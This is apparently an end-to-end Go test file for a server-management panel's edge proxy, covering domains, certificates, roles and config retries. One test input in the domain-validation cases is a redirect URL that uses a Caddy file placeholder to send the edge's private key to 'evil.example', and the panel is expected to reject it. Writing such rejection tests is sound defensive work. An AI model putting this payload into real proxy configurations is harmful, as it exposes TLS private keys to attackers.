package e2e

import (
	"encoding/json"
	"fmt"
	"net/http"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/pocketbase/dbx"

	agentv1 "github.com/oldbear24/PocketServerManager/gen/go/pocketcloud/agent/v1"
	"github.com/oldbear24/PocketServerManager/internal/schema"
	"github.com/oldbear24/PocketServerManager/internal/testutil"
)

// edgeState is what the server page reads about an edge.
type edgeState struct {
	Routes []struct {
		ID          string `json:"id"`
		Hostname    string `json:"hostname"`
		TargetKind  string `json:"target_kind"`
		Target      string `json:"target"`
		TLS         string `json:"tls"`
		Certificate *struct {
			ID       string   `json:"id"`
			Names    []string `json:"names"`
			NotAfter string   `json:"not_after"`
		} `json:"certificate"`
	} `json:"routes"`
	Edge struct {
		Role      bool    `json:"role"`
		InSync    bool    `json:"in_sync"`
		Applying  bool    `json:"applying"`
		Running   bool    `json:"running"`
		Error     string  `json:"error"`
		Revision  int     `json:"revision"`
		Requests  float64 `json:"requests_per_s"`
		LastApply *struct {
			ID     string `json:"id"`
			Status string `json:"status"`
			Error  string `json:"error"`
		} `json:"last_apply"`
	} `json:"edge"`
}

func (h *harness) edgeState(hostID, token string) edgeState {
	h.t.Helper()
	status, body := testutil.Do(h.t, h.handler, testutil.Request{Method: "GET", URL: "/api/pc/hosts/" + hostID + "/edge", Token: token})
	if status != http.StatusOK {
		h.t.Fatalf("edge state: %d %s", status, body)
	}
	var state edgeState
	if err := json.Unmarshal([]byte(body), &state); err != nil {
		h.t.Fatal(err)
	}
	return state
}

func (h *harness) edgeApplies(hostID string) int {
	h.t.Helper()
	count, err := h.app.CountRecords(schema.Commands, dbx.HashExp{"host": hostID, "type": "edge.apply"})
	if err != nil {
		h.t.Fatal(err)
	}
	return int(count)
}

func (h *harness) waitInSync(hostID string) {
	h.t.Helper()
	h.waitFor("the edge to serve what the panel wants", func() bool {
		host := h.host(hostID)
		return host.GetString("edge_digest") != "" && host.GetString("edge_digest") == host.GetString("edge_applied_digest")
	})
}

func addDomain(t *testing.T, h *harness, token, body string) (int, string) {
	t.Helper()
	return testutil.Do(t, h.handler, testutil.Request{Method: "POST", URL: "/api/collections/domains/records", Token: token, Body: body})
}

// TestAnEdgeGetsItsConfigOnItsOwn: an edge-role server that connects gets its
// edge without anyone asking, and a server without the role gets none.
func TestAnEdgeGetsItsConfigOnItsOwn(t *testing.T) {
	h := newHarness(t)
	_, host, fake := h.managedEdge("auto-edge")

	h.waitInSync(host.Id)
	if h.docker.Find("pocketcloud-edge") == nil || fake.server() == nil {
		t.Fatal("no edge")
	}

	// heartbeats of an edge in sync send nothing more
	applies := h.edgeApplies(host.Id)
	time.Sleep(500 * time.Millisecond)
	if again := h.edgeApplies(host.Id); again != applies {
		t.Errorf("an edge in sync got %d more applies", again-applies)
	}

	_, plain := h.enrolled("docker-only")
	time.Sleep(300 * time.Millisecond)
	if h.edgeApplies(plain.Id) != 0 {
		t.Error("a server without the edge role got an edge")
	}
}

func TestDomainsBecomeRoutes(t *testing.T) {
	h := newHarness(t)
	h.docker.AddContainer("web", "nginx:1", nil)
	_, host, fake := h.managedEdge("routes")
	h.waitInSync(host.Id)

	_, viewer := testutil.NewUser(t, h.app, "viewer@example.com", schema.RoleViewer)
	_, operator := testutil.NewUser(t, h.app, "operator@example.com", schema.RoleOperator)

	body := fmt.Sprintf(`{"hostname":"App.Example.com","host":%q,"target_kind":"container","container":"web","port":8080}`, host.Id)
	if status, _ := addDomain(t, h, viewer, body); status == http.StatusOK {
		t.Error("a viewer added a domain")
	}
	status, created := addDomain(t, h, operator, body)
	if status != http.StatusOK {
		t.Fatalf("adding a domain: %d %s", status, created)
	}

	h.waitFor("the route to reach the edge", func() bool {
		server := fake.server()
		if server == nil {
			return false
		}
		var config map[string]any
		return json.Unmarshal(server.Config(), &config) == nil && slices.Contains(hostRoutes(config), "app.example.com")
	})
	h.waitInSync(host.Id)
	if networks := h.docker.NetworksOf(h.docker.Find("web").ID); !slices.Contains(networks, "pocketcloud-edge") {
		t.Errorf("the container is not on the edge's network: %v", networks)
	}

	state := h.edgeState(host.Id, viewer)
	if len(state.Routes) != 1 || state.Routes[0].Hostname != "app.example.com" || state.Routes[0].Target != "web:8080" || state.Routes[0].TLS != "none" {
		t.Errorf("routes: %+v", state.Routes)
	}
	if !state.Edge.Role || !state.Edge.InSync || !state.Edge.Running {
		t.Errorf("edge: %+v", state.Edge)
	}

	// what a save refuses
	_, other := h.enrolled("no-edge")
	for name, body := range map[string]string{
		"the same name":            body,
		"a bad hostname":           fmt.Sprintf(`{"hostname":"not a name","host":%q,"target_kind":"container","container":"web","port":80}`, host.Id),
		"a server without an edge": fmt.Sprintf(`{"hostname":"x.example.com","host":%q,"target_kind":"container","container":"web","port":80}`, other.Id),
		"no port":                  fmt.Sprintf(`{"hostname":"y.example.com","host":%q,"target_kind":"container","container":"web"}`, host.Id),
		"a redirect to a path":     fmt.Sprintf(`{"hostname":"z.example.com","host":%q,"target_kind":"redirect","redirect_to":"/elsewhere"}`, host.Id),
		// Caddy fills in placeholders: this would send the edge's key to whoever asks
		"a redirect with a placeholder": fmt.Sprintf(`{"hostname":"w.example.com","host":%q,"target_kind":"redirect","redirect_to":"https://evil.example/{file./pocketcloud/certs/x.key}"}`, host.Id),
	} {
		if status, response := addDomain(t, h, operator, body); status == http.StatusOK {
			t.Errorf("%s was accepted: %s", name, response)
		}
	}
}

// TestAnUploadedCertificateServesHTTPS: a certificate uploaded by an admin goes to
// the edges whose domains it covers, before the config that uses it, and its key
// never sits in a command.
func TestAnUploadedCertificateServesHTTPS(t *testing.T) {
	h := newHarness(t)
	h.docker.AddContainer("web", "nginx:1", nil)
	running, host, fake := h.managedEdge("https")
	h.waitInSync(host.Id)

	_, admin := testutil.NewUser(t, h.app, "admin@example.com", schema.RoleAdmin)
	_, operator := testutil.NewUser(t, h.app, "operator@example.com", schema.RoleOperator)

	if status, response := addDomain(t, h, operator, fmt.Sprintf(`{"hostname":"app.example.com","host":%q,"target_kind":"container","container":"web","port":80,"https_redirect":true,"hsts":true}`, host.Id)); status != http.StatusOK {
		t.Fatalf("%d %s", status, response)
	}

	chain, key := selfSigned(t, "app.example.com")
	upload := func(token string, chain, key []byte) (int, string) {
		raw, _ := json.Marshal(map[string]string{"chain_pem": string(chain), "key_pem": string(key)})
		return testutil.Do(t, h.handler, testutil.Request{Method: "POST", URL: "/api/pc/certificates", Token: token, Body: string(raw)})
	}

	if status, _ := upload(operator, chain, key); status != http.StatusForbidden {
		t.Errorf("an operator uploaded a certificate: %d", status)
	}
	_, otherKey := selfSigned(t, "app.example.com")
	if status, response := upload(admin, chain, otherKey); status != http.StatusBadRequest || !strings.Contains(response, "do not fit") {
		t.Errorf("a key of another certificate: %d %s", status, response)
	}

	status, response := upload(admin, chain, key)
	if status != http.StatusCreated {
		t.Fatalf("upload: %d %s", status, response)
	}
	var created struct {
		ID string `json:"id"`
	}
	_ = json.Unmarshal([]byte(response), &created)
	if status, _ := upload(admin, chain, key); status != http.StatusConflict {
		t.Errorf("the same certificate twice: %d", status)
	}
	_, viewed := testutil.Do(t, h.handler, testutil.Request{Method: "GET", URL: "/api/collections/certificates/records/" + created.ID, Token: admin})
	if strings.Contains(viewed, "PRIVATE KEY") || strings.Contains(viewed, "key_pem") || !strings.Contains(viewed, "app.example.com") {
		t.Errorf("the certificate as the API shows it: %s", viewed)
	}
	stored, err := h.app.FindRecordById(schema.Certificates, created.ID)
	if err != nil || strings.Contains(stored.GetString("key_pem"), "PRIVATE KEY") {
		t.Error("the key is stored in plain text")
	}

	h.waitFor("the route to be served over HTTPS", func() bool {
		state := h.edgeState(host.Id, admin)
		return len(state.Routes) == 1 && state.Routes[0].TLS == "expiring" && state.Edge.InSync
	})

	config := fake.config(t)
	raw, _ := json.Marshal(config)
	if !strings.Contains(string(raw), `"tls_connection_policies"`) || !strings.Contains(string(raw), "Strict-Transport-Security") {
		t.Errorf("the config serves no HTTPS: %s", raw)
	}

	commands, err := h.app.FindRecordsByFilter(schema.Commands, "host={:h} && type='cert.install'", "", 0, 0, dbx.Params{"h": host.Id})
	if err != nil || len(commands) != 1 {
		t.Fatalf("%d installs, %v", len(commands), err)
	}
	if stored, _ := json.Marshal(commands[0].FieldsData()); strings.Contains(string(stored), "PRIVATE KEY") {
		t.Error("the key is stored in the command")
	}

	// removing it takes HTTPS away first, then the files
	if status, _ := testutil.Do(t, h.handler, testutil.Request{Method: "DELETE", URL: "/api/pc/certificates/" + created.ID, Token: admin}); status != http.StatusNoContent {
		t.Fatalf("removing the certificate: %d", status)
	}
	h.waitFor("the files to go", func() bool {
		removed, err := h.app.FindRecordsByFilter(schema.Commands, "host={:h} && type='cert.remove' && status='succeeded'", "", 0, 0, dbx.Params{"h": host.Id})
		return err == nil && len(removed) == 1
	})
	if state := h.edgeState(host.Id, admin); state.Routes[0].TLS != "none" {
		t.Errorf("after the removal: %+v", state.Routes)
	}
	_ = running
}

// TestARefusedConfigIsNotSentAgainByItself: heartbeats do not loop on a config the
// edge refused; "Apply again" sends it once more.
func TestARefusedConfigIsNotSentAgainByItself(t *testing.T) {
	h := newHarness(t)
	h.docker.AddContainer("web", "nginx:1", nil)
	_, host, fake := h.managedEdge("refused")
	h.waitInSync(host.Id)

	_, operator := testutil.NewUser(t, h.app, "operator@example.com", schema.RoleOperator)
	fake.rejectAll("loading http app module: unknown module")

	if status, response := addDomain(t, h, operator, fmt.Sprintf(`{"hostname":"app.example.com","host":%q,"target_kind":"container","container":"web","port":80}`, host.Id)); status != http.StatusOK {
		t.Fatalf("%d %s", status, response)
	}

	h.waitFor("the failure to show", func() bool {
		state := h.edgeState(host.Id, operator)
		return state.Edge.LastApply != nil && state.Edge.LastApply.Status == schema.CommandFailed && !state.Edge.InSync
	})
	applies := h.edgeApplies(host.Id)
	time.Sleep(500 * time.Millisecond)
	if again := h.edgeApplies(host.Id); again != applies {
		t.Errorf("a refused config was sent %d more times", again-applies)
	}

	if status, body := testutil.Do(t, h.handler, testutil.Request{Method: "POST", URL: "/api/pc/hosts/" + host.Id + "/edge/apply", Token: operator}); status != http.StatusAccepted {
		t.Fatalf("apply again: %d %s", status, body)
	}
	if h.edgeApplies(host.Id) != applies+1 {
		t.Error("apply again sent nothing")
	}
}

// TestTheEdgeRoleStaysWhileDomainsNeedIt, and the edge goes with the role.
func TestTheEdgeRoleStaysWhileDomainsNeedIt(t *testing.T) {
	h := newHarness(t)
	h.docker.AddContainer("web", "nginx:1", nil)
	_, host, fake := h.managedEdge("role")
	h.waitInSync(host.Id)

	_, admin := testutil.NewUser(t, h.app, "admin@example.com", schema.RoleAdmin)
	status, created := addDomain(t, h, admin, fmt.Sprintf(`{"hostname":"app.example.com","host":%q,"target_kind":"container","container":"web","port":80}`, host.Id))
	if status != http.StatusOK {
		t.Fatalf("%d %s", status, created)
	}
	var domain struct {
		ID string `json:"id"`
	}
	_ = json.Unmarshal([]byte(created), &domain)

	drop := testutil.Request{Method: "PATCH", URL: "/api/collections/hosts/records/" + host.Id, Token: admin, Body: `{"roles":["docker"]}`}
	if status, body := testutil.Do(t, h.handler, drop); status != http.StatusBadRequest || !strings.Contains(body, "domains") {
		t.Errorf("the role went while a domain needs it: %d %s", status, body)
	}

	if status, _ := testutil.Do(t, h.handler, testutil.Request{Method: "DELETE", URL: "/api/collections/domains/records/" + domain.ID, Token: admin}); status != http.StatusNoContent {
		t.Fatalf("removing the domain: %d", status)
	}
	if status, body := testutil.Do(t, h.handler, drop); status != http.StatusOK {
		t.Fatalf("removing the role: %d %s", status, body)
	}

	h.waitFor("the edge to go", func() bool {
		return h.docker.Find("pocketcloud-edge") == nil && fake.server() == nil && h.host(host.Id).GetString("edge_applied_digest") == ""
	})
}

// TestTheEdgeReportsItsRequestRate feeds the server page's request figure.
func TestTheEdgeReportsItsRequestRate(t *testing.T) {
	h := newHarness(t)
	_, host, fake := h.managedEdge("rate")
	h.waitInSync(host.Id)

	h.waitFor("a request rate", func() bool {
		if server := fake.server(); server != nil {
			server.Serve(10)
		}
		return h.host(host.Id).GetFloat("edge_requests_per_s") > 0
	})
}

// TestAnApplyThatNeverArrivedIsSentAgain: an edge.apply that expired while the
// server was away did not fail on the edge; when the agent is back, the edge
// gets its config. A refused one is tried again once the agent reconnects.
func TestAnApplyThatNeverArrivedIsSentAgain(t *testing.T) {
	h := newHarness(t)
	h.docker.AddContainer("web", "nginx:1", nil)
	running, host, fake := h.managedEdge("away")
	h.waitInSync(host.Id)

	if err := running.stop(); err != nil {
		t.Fatal(err)
	}
	h.waitFor("the stream to close", func() bool { return !h.host(host.Id).GetBool("stream_open") })

	_, operator := testutil.NewUser(t, h.app, "operator@example.com", schema.RoleOperator)
	if status, response := addDomain(t, h, operator, fmt.Sprintf(`{"hostname":"app.example.com","host":%q,"target_kind":"container","container":"web","port":80}`, host.Id)); status != http.StatusOK {
		t.Fatalf("%d %s", status, response)
	}
	var queued string
	h.waitFor("the apply to be queued", func() bool {
		commands, err := h.app.FindRecordsByFilter(schema.Commands, "host={:h} && type='edge.apply' && status='queued'", "", 0, 0, dbx.Params{"h": host.Id})
		if err == nil && len(commands) == 1 {
			queued = commands[0].Id
		}
		return queued != ""
	})
	// it expires before the server comes back, as after a long outage
	expired := h.command(queued)
	expired.Set("expires_at", time.Now().UTC().Add(-time.Minute))
	if err := h.app.Save(expired); err != nil {
		t.Fatal(err)
	}
	h.panel.Commands.Reap()
	if status := h.command(queued).GetString("status"); status != schema.CommandTimedOut && status != schema.CommandFailed {
		t.Fatalf("the apply did not expire: %s", status)
	}

	again := h.start(running.config)
	h.waitFor("the route to reach the edge after the outage", func() bool {
		server := fake.server()
		if server == nil {
			return false
		}
		var config map[string]any
		return json.Unmarshal(server.Config(), &config) == nil && slices.Contains(hostRoutes(config), "app.example.com")
	})

	// a refused config is tried again when the agent reconnects, once
	fake.rejectAll("loading http app module: unknown module")
	if status, response := addDomain(t, h, operator, fmt.Sprintf(`{"hostname":"b.example.com","host":%q,"target_kind":"container","container":"web","port":80}`, host.Id)); status != http.StatusOK {
		t.Fatalf("%d %s", status, response)
	}
	h.waitFor("the refusal", func() bool {
		state := h.edgeState(host.Id, operator)
		return state.Edge.LastApply != nil && state.Edge.LastApply.Status == schema.CommandFailed
	})
	refused := h.edgeApplies(host.Id)
	if err := again.stop(); err != nil {
		t.Fatal(err)
	}
	fake.mu.Lock()
	fake.reject = nil
	fake.mu.Unlock()
	if server := fake.server(); server != nil {
		server.Reject = nil
	}
	h.start(running.config)
	h.waitFor("the config to be tried again after the reconnect", func() bool {
		return h.edgeApplies(host.Id) > refused && h.host(host.Id).GetString("edge_applied_digest") == h.host(host.Id).GetString("edge_digest")
	})
}

// TestACertificateRemovedAnyWayLeavesTheEdge: deleting the record from the
// dashboard, not through the panel's route, takes it off the edge all the same,
// and the audit cannot bring back a certificate without its key.
func TestACertificateRemovedAnyWayLeavesTheEdge(t *testing.T) {
	h := newHarness(t)
	h.docker.AddContainer("web", "nginx:1", nil)
	_, host, _ := h.managedEdge("dashboard")
	h.waitInSync(host.Id)

	_, admin := testutil.NewUser(t, h.app, "admin@example.com", schema.RoleAdmin)
	_, superuser := testutil.NewSuperuser(t, h.app)
	if status, response := addDomain(t, h, admin, fmt.Sprintf(`{"hostname":"app.example.com","host":%q,"target_kind":"container","container":"web","port":80}`, host.Id)); status != http.StatusOK {
		t.Fatalf("%d %s", status, response)
	}
	chain, key := selfSigned(t, "app.example.com")
	raw, _ := json.Marshal(map[string]string{"chain_pem": string(chain), "key_pem": string(key)})
	status, response := testutil.Do(t, h.handler, testutil.Request{Method: "POST", URL: "/api/pc/certificates", Token: admin, Body: string(raw)})
	if status != http.StatusCreated {
		t.Fatalf("upload: %d %s", status, response)
	}
	var created struct {
		ID string `json:"id"`
	}
	_ = json.Unmarshal([]byte(response), &created)
	h.waitFor("HTTPS", func() bool { return h.edgeState(host.Id, admin).Routes[0].TLS == "expiring" })

	// the audit's revert of the upload is refused
	entry, err := h.app.FindFirstRecordByFilter(schema.AuditLog, "collection='certificates' && action='create'")
	if err != nil {
		t.Fatal(err)
	}
	if status, _ := testutil.Do(t, h.handler, testutil.Request{Method: "POST", URL: "/api/pc/audit/" + entry.Id + "/revert", Token: admin}); status == http.StatusOK {
		t.Error("the upload of a certificate was reverted")
	}

	if status, _ := testutil.Do(t, h.handler, testutil.Request{Method: "DELETE", URL: "/api/collections/certificates/records/" + created.ID, Token: superuser}); status != http.StatusNoContent {
		t.Fatalf("a superuser's delete: %d", status)
	}
	h.waitFor("the edge to drop the certificate", func() bool {
		removed, err := h.app.FindRecordsByFilter(schema.Commands, "host={:h} && type='cert.remove' && status='succeeded'", "", 0, 0, dbx.Params{"h": host.Id})
		return err == nil && len(removed) == 1 && h.edgeState(host.Id, admin).Routes[0].TLS == "none"
	})
}

// TestAnInstallUnderWayIsUndoneWithItsCertificate: the certificate goes while its
// install waits for an offline server; that server gets the removal too.
func TestAnInstallUnderWayIsUndoneWithItsCertificate(t *testing.T) {
	h := newHarness(t)
	host := testutil.NewHost(t, h.app, "offline-edge")
	cert := h.storeCertificate(selfSigned(t, "app.example.com"))

	install := h.create(host.Id, &agentv1.Command{Payload: &agentv1.Command_CertInstall{CertInstall: &agentv1.CertInstall{CertificateId: cert.Id}}})
	if err := h.app.Delete(cert); err != nil {
		t.Fatal(err)
	}
	h.waitFor("the removal to be queued", func() bool {
		removals, err := h.app.FindRecordsByFilter(schema.Commands, "host={:h} && type='cert.remove'", "", 0, 0, dbx.Params{"h": host.Id})
		return err == nil && len(removals) == 1 && strings.Contains(fmt.Sprint(removals[0].Get("payload")), cert.Id)
	})
	_ = install
}
